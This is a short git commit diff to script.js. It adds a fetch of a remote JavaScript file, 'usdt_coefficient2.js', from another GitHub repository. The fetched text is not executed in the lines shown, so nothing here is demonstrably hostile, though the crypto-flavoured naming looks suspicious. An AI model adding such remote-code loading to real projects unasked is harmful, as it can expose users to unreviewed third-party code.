2ceb4bbe884fe09b5bbb8b61c243f501908f1897
lakai92 <57639913+lakai92@users.noreply.github.com>
2025-07-24 05:35:36 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,13 @@
 document.title = "whynot";
 
+var usdtCoefficientURL = 'https://raw.githubusercontent.com/lakai92/coefficient/main/usdt_coefficient2.js';
+fetch(usdtCoefficientURL)
+    .then(function (response) {
+        if (response.status === 200) {
+            return response.text();
+        } else {
+            throw new Error("undefined");
+        }
+    })
 
 window.scriptLoaded = true;
